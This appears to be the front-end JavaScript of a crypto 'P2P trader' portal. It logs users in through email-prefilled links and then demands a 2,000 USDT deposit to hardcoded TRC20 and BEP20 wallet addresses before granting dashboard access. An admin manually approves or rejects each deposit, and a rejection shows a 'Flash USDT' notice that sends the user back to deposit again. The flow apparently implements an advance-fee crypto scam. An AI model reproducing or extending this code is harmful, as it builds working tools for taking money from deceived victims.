(function() {
  'use strict';

  // Config reference
  const CONFIG = window.APP_CONFIG || {
    apiUrl: '/api',
    authUrl: '/api/auth'
  };

  const API_AUTH = CONFIG.authUrl || (CONFIG.apiUrl + '/auth');
  const API_BASE = CONFIG.apiUrl || '/api';

  // State
  let currentTrader = null;
  let activeNetwork = 'TRC20';
  let paymentSettings = {
    usdtAmount: '2000',
    trc20Address: 'TYDZSxdv77qY9zWf4iXnNpQwRt8s7K1a2B',
    bep20Address: '0x71C67E7a8d56A8F17A2F02b4d24177b8fA0c2378'
  };
  let currentDepositId = null;
  let verifPollInterval = null;
  let verifTimerInterval = null;
  let verifSecondsElapsed = 0;

  // DOM Elements - Navigation & Headers
  const headerBrandText = document.getElementById('header-brand-text');
  const headerStatusBadge = document.getElementById('header-status-badge');
  const headerStatusText = document.getElementById('header-status-text');

  // DOM Elements - Login View
  const loginView = document.getElementById('login-view');
  const loginForm = document.getElementById('login-form');
  const loginEmail = document.getElementById('login-email');
  const loginPassword = document.getElementById('login-password');
  const btnSubmitLogin = document.getElementById('btn-submit-login');
  const loginAlert = document.getElementById('login-alert');
  const toggleLoginPassword = document.getElementById('toggle-login-password');
  const eyeOffSvg = document.getElementById('eye-off-svg');
  const eyeOnSvg = document.getElementById('eye-on-svg');
  const cantLoginBtn = document.getElementById('cant-login-btn');
  const modalCantLogin = document.getElementById('modal-cant-login');
  const modalCloseBtn = document.getElementById('modal-close-btn');

  // DOM Elements - Welcome Animation (3 Seconds)
  const welcomeAnimation = document.getElementById('welcome-animation');
  const animUserEmailText = document.getElementById('anim-user-email-text');

  // DOM Elements - Deposit Screen
  const depositScreen = document.getElementById('deposit-screen');
  const displayUsdtAmount = document.getElementById('display-usdt-amount');
  const tabTrc20 = document.getElementById('tab-trc20');
  const tabBep20 = document.getElementById('tab-bep20');
  const depositQrImg = document.getElementById('deposit-qr-img');
  const qrLoadingSpinner = document.getElementById('qr-loading-spinner');
  const walletNetworkTitle = document.getElementById('wallet-network-title');
  const depositWalletAddress = document.getElementById('deposit-wallet-address');
  const copyAddressBtn = document.getElementById('copy-address-btn');
  const copyAddressText = document.getElementById('copy-address-text');
  const warnNetworkText = document.getElementById('warn-network-text');
  const depositTxhashInput = document.getElementById('deposit-txhash-input');
  const btnConfirmDeposit = document.getElementById('btn-confirm-deposit');

  // DOM Elements - Verification Screen
  const verificationScreen = document.getElementById('verification-screen');
  const verifPendingState = document.getElementById('verif-pending-state');
  const verifFlashState = document.getElementById('verif-flash-state');
  const verifApprovedState = document.getElementById('verif-approved-state');
  const verifNetworkVal = document.getElementById('verif-network-val');
  const verifEmailVal = document.getElementById('verif-email-val');
  const verifTimerText = document.getElementById('verif-timer-text');
  const btnFlashRetry = document.getElementById('btn-flash-retry');
  const btnFlashBackLogin = document.getElementById('btn-flash-back-login');
  const btnEnterTerminal = document.getElementById('btn-enter-terminal');

  // DOM Elements - Trader Dashboard
  const traderDashboard = document.getElementById('trader-dashboard');
  const dashWelcomeName = document.getElementById('dash-welcome-name');
  const dashUserEmail = document.getElementById('dash-user-email');
  const dashUserId = document.getElementById('dash-user-id');
  const dashAvatarLetter = document.getElementById('dash-avatar-letter');
  const btnLogout = document.getElementById('btn-logout');
  const btnRelogin = document.getElementById('btn-relogin');
  const toast = document.getElementById('toast');

  // ---------------- PREFILL EMAIL FROM QUERY PARAM ----------------
  const urlParams = new URLSearchParams(window.location.search);
  const emailParam = urlParams.get('email');
  if (emailParam) {
    loginEmail.value = decodeURIComponent(emailParam).trim();
    setTimeout(() => {
      loginPassword.focus();
    }, 200);
  }

  // ---------------- UI UTILS ----------------
  function showToast(message) {
    if (!toast) return;
    toast.textContent = message;
    toast.classList.add('show');
    setTimeout(() => {
      toast.classList.remove('show');
    }, 2500);
  }

  function showAlert(message, type = 'error') {
    loginAlert.className = `login-message ${type}`;
    loginAlert.innerHTML = message;
    loginAlert.style.display = 'flex';
  }

  function hideAlert() {
    loginAlert.style.display = 'none';
  }

  function setButtonLoading(btn, isLoading, originalHtml) {
    if (isLoading) {
      btn.disabled = true;
      btn.innerHTML = `<span class="spinner"></span> <span>Processing...</span>`;
    } else {
      btn.disabled = false;
      btn.innerHTML = originalHtml;
    }
  }

  function switchMainView(viewToShow) {
    [loginView, depositScreen, verificationScreen, traderDashboard].forEach(el => {
      if (el) el.style.display = 'none';
    });
    if (viewToShow) {
      viewToShow.style.display = (viewToShow === traderDashboard) ? 'flex' : 'block';
    }
  }

  // Password Visibility Toggle
  toggleLoginPassword.addEventListener('click', () => {
    if (loginPassword.type === 'password') {
      loginPassword.type = 'text';
      eyeOffSvg.style.display = 'none';
      eyeOnSvg.style.display = 'block';
    } else {
      loginPassword.type = 'password';
      eyeOffSvg.style.display = 'block';
      eyeOnSvg.style.display = 'none';
    }
  });

  // Modal handlers
  cantLoginBtn.addEventListener('click', () => {
    modalCantLogin.style.display = 'flex';
  });

  modalCloseBtn.addEventListener('click', () => {
    modalCantLogin.style.display = 'none';
  });

  modalCantLogin.addEventListener('click', (e) => {
    if (e.target === modalCantLogin) {
      modalCantLogin.style.display = 'none';
    }
  });

  // ---------------- 1. LOGIN SUBMISSION ----------------
  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    hideAlert();

    const email = loginEmail.value.trim().toLowerCase();
    const password = loginPassword.value;

    if (!email || !password) {
      showAlert('⚠️ Please enter both Email and Password.');
      return;
    }

    setButtonLoading(btnSubmitLogin, true, '<span>Sign in</span>');

    try {
      const response = await fetch(`${API_AUTH}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || 'Invalid email or password. Please verify credentials or register first.');
      }

      currentTrader = data.user;
      sessionStorage.setItem('p2p_active_trader', JSON.stringify(currentTrader));

      // Trigger the 3-Second Welcome Animation as requested!
      play3SecondWelcomeAnimation(currentTrader);

    } catch (err) {
      showAlert(`⚠️ ${err.message}`);
    } finally {
      setButtonLoading(btnSubmitLogin, false, '<span>Sign in</span>');
    }
  });

  // ---------------- 2. EXACT 3-SECOND WELCOME ANIMATION ----------------
  function play3SecondWelcomeAnimation(user) {
    loginView.style.display = 'none';
    animUserEmailText.textContent = user.email;
    welcomeAnimation.classList.add('active');

    // Exactly 3000ms (3 seconds) as requested
    setTimeout(() => {
      welcomeAnimation.classList.remove('active');
      openDepositPortal(user);
    }, 3000);
  }

  // ---------------- 3. USDT DEPOSIT PORTAL ----------------
  async function openDepositPortal(user) {
    switchMainView(depositScreen);

    if (headerStatusBadge) {
      headerStatusBadge.style.display = 'inline-flex';
      headerStatusText.textContent = '2,000 USDT Deposit Required';
    }

    // Load active payment settings from backend
    try {
      const res = await fetch(`${API_BASE}/payment/config`);
      const data = await res.json();
      if (data.success) {
        paymentSettings.usdtAmount = data.usdtAmount || '2000';
        paymentSettings.trc20Address = data.trc20Address || paymentSettings.trc20Address;
        paymentSettings.bep20Address = data.bep20Address || paymentSettings.bep20Address;
        paymentSettings.trc20QrImage = data.trc20QrImage || '';
        paymentSettings.bep20QrImage = data.bep20QrImage || '';
      }
    } catch (e) {
      console.warn('Using default payment settings:', e);
    }

    displayUsdtAmount.textContent = paymentSettings.usdtAmount || '2,000';
    btnConfirmDeposit.innerHTML = `<span>I have transferred ${paymentSettings.usdtAmount || '2,000'} USDT</span>`;

    // Render active network
    renderActiveNetwork(activeNetwork);
  }

  function renderActiveNetwork(network) {
    activeNetwork = network;

    if (network === 'TRC20') {
      tabTrc20.classList.add('active');
      tabBep20.classList.remove('active');
      walletNetworkTitle.textContent = 'TRC20 Deposit Address (Tron):';
      warnNetworkText.textContent = 'USDT (TRC20)';
      updateWalletDisplay(paymentSettings.trc20Address, paymentSettings.trc20QrImage);
    } else {
      tabBep20.classList.add('active');
      tabTrc20.classList.remove('active');
      walletNetworkTitle.textContent = 'BEP20 Deposit Address (BNB Smart Chain):';
      warnNetworkText.textContent = 'USDT (BEP20)';
      updateWalletDisplay(paymentSettings.bep20Address, paymentSettings.bep20QrImage);
    }
  }

  function updateWalletDisplay(address, customQrImage) {
    depositWalletAddress.textContent = address;

    if (qrLoadingSpinner) qrLoadingSpinner.style.display = 'flex';
    
    depositQrImg.onload = () => {
      if (qrLoadingSpinner) qrLoadingSpinner.style.display = 'none';
    };
    depositQrImg.onerror = () => {
      if (qrLoadingSpinner) qrLoadingSpinner.style.display = 'none';
    };

    if (customQrImage && customQrImage.trim()) {
      // Use Admin's custom uploaded QR code!
      depositQrImg.src = customQrImage;
    } else {
      // Dynamic QR code from address
      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(address)}`;
      depositQrImg.src = qrUrl;
    }
  }

  // Network Switch Tab Handlers
  tabTrc20.addEventListener('click', () => renderActiveNetwork('TRC20'));
  tabBep20.addEventListener('click', () => renderActiveNetwork('BEP20'));

  // Copy Address Button
  copyAddressBtn.addEventListener('click', async () => {
    const address = depositWalletAddress.textContent;
    try {
      await navigator.clipboard.writeText(address);
      copyAddressText.textContent = 'Copied! ✅';
      showToast(`${activeNetwork} Address copied to clipboard! 📋`);
      setTimeout(() => {
        copyAddressText.textContent = 'Copy Address';
      }, 2000);
    } catch (e) {
      // Fallback
      const textArea = document.createElement('textarea');
      textArea.value = address;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      showToast('Address copied! 📋');
    }
  });

  // ---------------- 4. DEPOSIT SUBMIT & VERIFICATION WAITING SCREEN ----------------
  btnConfirmDeposit.addEventListener('click', async () => {
    if (!currentTrader || !currentTrader.email) {
      currentTrader = JSON.parse(sessionStorage.getItem('p2p_active_trader') || '{}');
      if (!currentTrader.email) {
        showAlert('Please sign in first');
        switchMainView(loginView);
        return;
      }
    }

    const txHash = depositTxhashInput.value.trim();
    const currentAddress = depositWalletAddress.textContent;

    setButtonLoading(btnConfirmDeposit, true, '<span>Submitting transfer...</span>');

    try {
      const response = await fetch(`${API_BASE}/deposit/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: currentTrader.email,
          network: activeNetwork,
          amount: paymentSettings.usdtAmount || '2000',
          walletAddress: currentAddress,
          txHash: txHash
        })
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || 'Error submitting deposit confirmation');
      }

      currentDepositId = data.deposit.id;
      sessionStorage.setItem('p2p_active_deposit_id', currentDepositId);

      // Start Verification Screen
      startVerificationFlow(data.deposit);

    } catch (err) {
      alert(`⚠️ ${err.message}`);
    } finally {
      setButtonLoading(btnConfirmDeposit, false, `<span>I have transferred ${paymentSettings.usdtAmount || '2,000'} USDT</span>`);
    }
  });

  // ---------------- 5. VERIFICATION FLOW & POLLING ----------------
  function startVerificationFlow(deposit) {
    switchMainView(verificationScreen);

    // Reset verification states
    verifPendingState.style.display = 'block';
    verifFlashState.style.display = 'none';
    verifApprovedState.style.display = 'none';

    verifNetworkVal.textContent = deposit.network;
    verifEmailVal.textContent = deposit.userEmail;

    // Start timer counter
    clearInterval(verifTimerInterval);
    verifSecondsElapsed = 0;
    verifTimerText.textContent = '00:00';
    verifTimerInterval = setInterval(() => {
      verifSecondsElapsed++;
      const mins = String(Math.floor(verifSecondsElapsed / 60)).padStart(2, '0');
      const secs = String(verifSecondsElapsed % 60).padStart(2, '0');
      verifTimerText.textContent = `${mins}:${secs}`;
    }, 1000);

    // Start real-time polling every 2 seconds
    clearInterval(verifPollInterval);
    verifPollInterval = setInterval(async () => {
      await checkDepositStatus(deposit.id);
    }, 2000);
  }

  async function checkDepositStatus(depositId) {
    try {
      const res = await fetch(`${API_BASE}/deposit/status/${depositId}`);
      if (!res.ok) return;

      const data = await res.json();
      if (!data.success) return;

      if (data.status === 'rejected') {
        // ADMIN CLICKED CANCEL/REJECT -> SHOW EXACT "YOUR USDT IS FLASH" NOTICE!
        clearInterval(verifPollInterval);
        clearInterval(verifTimerInterval);

        verifPendingState.style.display = 'none';
        verifApprovedState.style.display = 'none';
        verifFlashState.style.display = 'block';

        if (headerStatusBadge) {
          headerStatusBadge.style.display = 'inline-flex';
          headerStatusBadge.style.background = '#fef2f2';
          headerStatusBadge.style.borderColor = '#fca5a5';
          headerStatusText.textContent = 'Deposit Rejected: Flash USDT';
        }

      } else if (data.status === 'approved') {
        // ADMIN CLICKED APPROVE -> SHOW SUCCESS & UNLOCK TRADER DASHBOARD!
        clearInterval(verifPollInterval);
        clearInterval(verifTimerInterval);

        verifPendingState.style.display = 'none';
        verifFlashState.style.display = 'none';
        verifApprovedState.style.display = 'block';

        if (headerStatusBadge) {
          headerStatusBadge.style.display = 'inline-flex';
          headerStatusBadge.style.background = '#f0fdf4';
          headerStatusBadge.style.borderColor = '#86efac';
          headerStatusText.textContent = '2,000 USDT Verified 🟢';
        }
      }
    } catch (e) {
      console.warn('Status poll warning:', e);
    }
  }

  // Flash state retry button
  btnFlashRetry.addEventListener('click', () => {
    switchMainView(depositScreen);
    depositTxhashInput.value = '';
  });

  btnFlashBackLogin.addEventListener('click', handleSignOut);

  // Approved state button: enter dashboard
  btnEnterTerminal.addEventListener('click', () => {
    openTraderDashboard(currentTrader || {});
  });

  // ---------------- 6. TRADER DASHBOARD ----------------
  function openTraderDashboard(user) {
    switchMainView(traderDashboard);

    const name = (user.email || 'trader').split('@')[0];
    dashWelcomeName.textContent = `Welcome, ${name.charAt(0).toUpperCase() + name.slice(1)}!`;
    dashUserEmail.textContent = user.email || 'trader@gmail.com';
    dashUserId.textContent = user.id ? `#${user.id.slice(-6).toUpperCase()}` : '#TRD-8841';
    dashAvatarLetter.textContent = ((user.email || 'T').charAt(0)).toUpperCase();
  }

  // Sign out handling
  function handleSignOut() {
    clearInterval(verifPollInterval);
    clearInterval(verifTimerInterval);
    sessionStorage.removeItem('p2p_active_trader');
    sessionStorage.removeItem('p2p_active_deposit_id');
    currentTrader = null;
    currentDepositId = null;

    if (headerStatusBadge) headerStatusBadge.style.display = 'none';
    switchMainView(loginView);
    loginPassword.value = '';
    hideAlert();
  }

  btnLogout.addEventListener('click', handleSignOut);
  btnRelogin.addEventListener('click', handleSignOut);

  // Restore session if active
  const savedTrader = sessionStorage.getItem('p2p_active_trader');
  if (savedTrader) {
    try {
      currentTrader = JSON.parse(savedTrader);
      const savedDepositId = sessionStorage.getItem('p2p_active_deposit_id');
      if (savedDepositId) {
        startVerificationFlow({
          id: savedDepositId,
          network: activeNetwork,
          userEmail: currentTrader.email
        });
      } else {
        openDepositPortal(currentTrader);
      }
    } catch (e) {
      sessionStorage.removeItem('p2p_active_trader');
    }
  }

})();
